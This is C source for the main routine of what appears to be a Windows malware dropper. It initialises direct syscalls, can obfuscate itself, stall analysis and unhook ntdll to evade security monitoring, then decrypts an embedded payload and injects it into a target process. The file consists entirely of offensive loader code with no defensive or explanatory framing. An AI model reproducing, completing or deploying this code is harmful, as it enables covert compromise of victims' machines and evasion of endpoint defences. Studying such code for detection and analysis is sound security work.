#include "common.h"


int main() {

    DebugPrint("Debug mode enabled.\n");
    DebugPrint("Dropper started...\n");

    if (!InitializeSyscalls()) {
        DebugPrint("[X] Failed to initialize syscalls.\n");
        return FALSE;
    }

    DebugPrint("\n### Setup Complete ###\n\n");

#ifdef ENTROPY_REDUCTION_ENABLED
    init_obfuscation();
#endif

#ifdef ANTI_ANALYSIS_ENABLED
    AntiAnalysis(30000); // 30 seconds timeout
#endif

#ifdef UNHOOKING_ENABLED
    unhookingNtdll();
#endif

BOOL bSuccess;
PBYTE pDecryptedPayload = (PBYTE)Payload;
SIZE_T dwDecryptedPayloadSize = 0;

#if defined(ENCRYPTED_PAYLOAD)
    bSuccess = decrypt(Payload, PayloadSize, Key, KeySize, Iv, &pDecryptedPayload, &dwDecryptedPayloadSize);
    if (bSuccess && pDecryptedPayload != NULL) {
        PayloadSize = dwDecryptedPayloadSize;
        DebugPrint("[i] Payload decrypted successfully. [size: %d]\n", PayloadSize);
    }
#elif defined(OBFUSCATED_PAYLOAD)
    bSuccess = deobfuscate(Payload, PayloadSize, &pDecryptedPayload, &dwDecryptedPayloadSize);
    if (bSuccess && pDecryptedPayload != NULL) {
        PayloadSize = dwDecryptedPayloadSize;
        DebugPrint("[i] Payload deobfuscated successfully. [size: %d]\n", PayloadSize);
    }
#else
    bSuccess = decrypt(pDecryptedPayload, PayloadSize, NULL, 0, NULL, NULL, NULL);
#endif

    if (!bSuccess) {
        DebugPrint("[X] Failed to decrypt payload.\n");
        return FALSE;
    }

    DebugPrint("[i] Setup complete... Beginning injection!\n");
#ifdef PROCESS_NAME_ENABLED
    LPWSTR szProcessName =  (LPWSTR)ProcessName;
    DebugPrint("[i] Targeting process %ws for remote operations...\n", szProcessName);
    bSuccess = inject_payload(pDecryptedPayload, PayloadSize, szProcessName);
#else
    bSuccess = inject_payload(pDecryptedPayload, PayloadSize);
#endif

#ifdef DEBUG
    if (bSuccess) {
        DebugPrint("[i] Payload injected successfully.\n");
    } else {
        DebugPrint("[X] Failed to inject payload.\n");
    }
    getchar();
#endif

    return 0;
}